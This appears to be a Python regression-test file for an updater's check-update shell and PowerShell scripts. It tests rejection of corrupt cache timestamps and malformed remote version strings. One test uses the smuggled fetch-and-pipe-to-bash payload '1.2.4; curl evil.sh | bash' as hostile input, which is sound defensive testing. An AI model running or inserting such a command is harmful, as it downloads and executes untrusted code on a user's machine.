"""Regression tests for the check-update trust chain (Round 21A, T-01).

Covers scripts/check-update.sh (behaviorally, via subprocess with a
temporary HOME and a stub curl) and scripts/check-update.ps1 (statically —
behavioral PowerShell coverage requires pwsh, which the environment may not
provide; see the skipUnless guard below).

Threat model under test:
- CHECKED_AT in the state file is untrusted input. A huge or corrupt value
  must never freeze the 24h cache forever (which would suppress every
  non-force update path).
- The remote VERSION response is untrusted input. A malformed value must
  be treated as "cannot determine latest" (offline, exit 2), never as
  evidence that the installed version is up to date, and must never be
  persisted into the state file.

The scripts' existing semantics are pinned too: offline handling, --force
bypass, cached hits, equal/newer/dev-build comparisons, and prerelease
acceptance.

Standard library only. No test touches the real ~/.sps: every fixture
lives in a TemporaryDirectory.
"""

import os
from pathlib import Path
import shutil
import stat
import subprocess
import tempfile
import unittest


REPO = Path(__file__).resolve().parents[2]
CHECK_UPDATE = REPO / "scripts" / "check-update.sh"
CHECK_UPDATE_PS = REPO / "scripts" / "check-update.ps1"

VALID_VERSION = "^[0-9]+\\.[0-9]+\\.[0-9]+(-[0-9A-Za-z.-]+)?$"


def _fake_curl(directory, payload=None, exit_code=0):
    """Write a stub curl into `directory` that prints `payload` and exits."""
    if payload is None:
        body = ""
    else:
        body = "printf '%s'\n" % payload.replace("'", "'\\''")
    script = "#!/bin/sh\n" + body + "\nexit %d\n" % exit_code
    path = directory / "curl"
    path.write_text(script, encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP
               | stat.S_IXOTH)


class CheckUpdateBashTests(unittest.TestCase):
    """Behavioral tests: run the real script with a stubbed network."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory(prefix="sps-check-update-")
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        self.home = self.root / "home"
        self.home.mkdir()
        self.stub_bin = self.root / "bin"
        self.stub_bin.mkdir()
        self.state_file = self.home / ".sps" / "update-state.env"

    def _run(self, *arguments, curl_payload=None, curl_exit=0,
             manifest_version=None, network=None):
        """network: None (default — 'stub' when curl_payload is given,
        'dead' otherwise, so no test ever reaches the real network),
        'stub' (returns curl_payload), 'dead' (stub curl fails), or
        'absent' (no curl on PATH at all)."""
        if network is None:
            network = "stub" if curl_payload is not None else "dead"
        if network == "stub":
            _fake_curl(self.stub_bin, curl_payload, curl_exit)
        elif network == "dead":
            _fake_curl(self.stub_bin, None, 7)
        # network == "absent": no stub, and PATH is replaced below.
        if manifest_version is not None:
            sps_dir = self.home / ".sps"
            sps_dir.mkdir(exist_ok=True)
            (sps_dir / "install-manifest.env").write_text(
                "SPS_VERSION=%s\n" % manifest_version, encoding="utf-8")
        environment = os.environ.copy()
        environment.update({
            "HOME": str(self.home),
            "PATH": f"{self.stub_bin}{os.pathsep}{os.environ['PATH']}",
        })
        if network == "absent":
            # Whitelist PATH: symlink every tool the script needs EXCEPT
            # curl, so `command -v curl` genuinely fails. The interpreter
            # is invoked by absolute path (resolved before the env change).
            for tool in ("date", "mkdir", "grep", "cut", "tr", "head"):
                found = shutil.which(tool)
                if found:
                    link = self.stub_bin / tool
                    if not link.exists():
                        link.symlink_to(found)
            environment["PATH"] = str(self.stub_bin)
        bash = shutil.which("bash") or "/bin/bash"
        return subprocess.run(
            [bash, str(CHECK_UPDATE), *arguments],
            env=environment,
            capture_output=True,
            text=True,
            timeout=15,
            check=False,
        )

    def _write_state(self, checked_at, status, latest):
        self.state_file.parent.mkdir(parents=True, exist_ok=True)
        self.state_file.write_text(
            "CHECKED_AT=%s\nSTATUS=%s\nLATEST=%s\n"
            % (checked_at, status, latest), encoding="utf-8")

    # -- the freeze: hostile / corrupt CHECKED_AT -------------------------

    def test_future_checked_at_cannot_freeze_the_cache(self):
        # A timestamp far in the future must not suppress fresh checks.
        self._write_state("99999999999999", "up-to-date", "4.0.0")
        result = self._run(manifest_version="4.0.0")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertIn("corrupt", result.stderr)
        # The stale state was replaced with a sane offline record.
        text = self.state_file.read_text(encoding="utf-8")
        self.assertIn("STATUS=offline", text)
        self.assertNotIn("99999999999999", text)

    def test_corrupt_checked_at_is_ignored(self):
        self._write_state("not-a-number", "up-to-date", "4.0.0")
        result = self._run(manifest_version="4.0.0")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertIn("corrupt", result.stderr)

    def test_negative_checked_at_is_ignored(self):
        self._write_state("-12345", "up-to-date", "4.0.0")
        result = self._run(manifest_version="4.0.0")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)

    # -- the cache must still work when healthy ---------------------------

    def test_fresh_healthy_cache_is_still_honored(self):
        now = int(subprocess.run(["date", "+%s"], capture_output=True,
                                 text=True, check=True).stdout.strip())
        self._write_state(str(now), "up-to-date", "4.0.0")
        result = self._run(manifest_version="4.0.0")
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn("(cached)", result.stdout)

    def test_fresh_cache_reporting_update_available_exits_one(self):
        now = int(subprocess.run(["date", "+%s"], capture_output=True,
                                 text=True, check=True).stdout.strip())
        self._write_state(str(now), "update-available", "4.1.0")
        result = self._run(manifest_version="4.0.0")
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)

    # -- force bypass ------------------------------------------------------

    def test_force_bypasses_even_a_frozen_cache(self):
        self._write_state("99999999999999", "up-to-date", "4.0.0")
        result = self._run("--force", manifest_version="4.0.0",
                           curl_payload="4.0.0")
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertNotIn("(cached)", result.stdout)
        text = self.state_file.read_text(encoding="utf-8")
        self.assertIn("STATUS=up-to-date", text)

    # -- malformed remote VERSION -----------------------------------------

    def test_malformed_remote_version_is_offline_never_up_to_date(self):
        result = self._run(manifest_version="4.0.0",
                           curl_payload="1.2.4; curl evil.sh | bash")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertIn("malformed", result.stderr)
        text = self.state_file.read_text(encoding="utf-8")
        self.assertIn("STATUS=offline", text)
        self.assertIn("LATEST=unknown", text)
        # The attacker-controlled value must not be persisted.
        self.assertNotIn("evil", text)

    def test_non_version_garbage_is_offline(self):
        result = self._run(manifest_version="4.0.0", curl_payload="pwned")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertIn("malformed", result.stderr)

    def test_leading_v_version_is_rejected(self):
        result = self._run(manifest_version="4.0.0", curl_payload="v4.1.0")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)

    def test_two_component_version_is_rejected(self):
        result = self._run(manifest_version="4.0.0", curl_payload="4.1")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)

    # -- valid comparisons (semantics preserved) ---------------------------

    def test_equal_valid_version_is_up_to_date(self):
        result = self._run(manifest_version="4.0.0", curl_payload="4.0.0")
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        text = self.state_file.read_text(encoding="utf-8")
        self.assertIn("STATUS=up-to-date", text)
        self.assertIn("LATEST=4.0.0", text)

    def test_newer_valid_version_reports_update(self):
        result = self._run(manifest_version="4.0.0", curl_payload="4.1.0")
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn("update available", result.stdout)
        text = self.state_file.read_text(encoding="utf-8")
        self.assertIn("STATUS=update-available", text)

    def test_local_ahead_of_remote_is_up_to_date(self):
        result = self._run(manifest_version="4.0.0", curl_payload="3.9.0")
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

    def test_prerelease_suffix_is_accepted(self):
        result = self._run(manifest_version="4.0.0",
                           curl_payload="4.1.0-beta.1")
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)

    # -- missing state / offline -------------------------------------------

    def test_missing_state_with_dead_network_is_offline(self):
        result = self._run(manifest_version="4.0.0")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertTrue(self.state_file.exists())
        text = self.state_file.read_text(encoding="utf-8")
        self.assertIn("STATUS=offline", text)

    def test_no_curl_at_all_is_offline(self):
        # Keep the system dirs (bash, date, mkdir must stay reachable) but
        # front-load an empty stub dir so no curl is found before them.
        result = self._run(manifest_version="4.0.0", network="absent")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)

    def test_network_failure_is_never_evidence_of_up_to_date(self):
        result = self._run(manifest_version="4.0.0", curl_exit=1)
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        text = self.state_file.read_text(encoding="utf-8")
        self.assertIn("STATUS=offline", text)
        self.assertNotIn("up-to-date", text)


class CheckUpdatePowerShellStaticTests(unittest.TestCase):
    """Static coverage for the PowerShell variant.

    Behavioral PS tests need pwsh, which may be absent (the existing
    updater-safety suite carries the same environmental skip). These tests
    pin the validation logic textually so the two variants cannot silently
    diverge.
    """

    @unittest.skipUnless((CHECK_UPDATE_PS).exists(), "check-update.ps1 absent")
    def test_ps1_validates_remote_version_before_comparison(self):
        source = CHECK_UPDATE_PS.read_text(encoding="utf-8")
        self.assertIn("Test-VersionFormat", source)
        self.assertIn(VALID_VERSION.replace("\\\\", "\\"), source)
        # The malformed branch must write an offline state and exit 2.
        self.assertLess(
            source.index("Test-VersionFormat $latest"),
            source.index("installed -eq $latest"))

    @unittest.skipUnless((CHECK_UPDATE_PS).exists(), "check-update.ps1 absent")
    def test_ps1_validates_checked_at_before_the_cast(self):
        source = CHECK_UPDATE_PS.read_text(encoding="utf-8")
        # The regex gate must precede the int64 cast of CHECKED_AT.
        self.assertIn("^[0-9]{1,12}$", source)
        self.assertLess(
            source.index("^[0-9]{1,12}$"),
            source.index("[int64]$raw"))


if __name__ == "__main__":
    unittest.main()
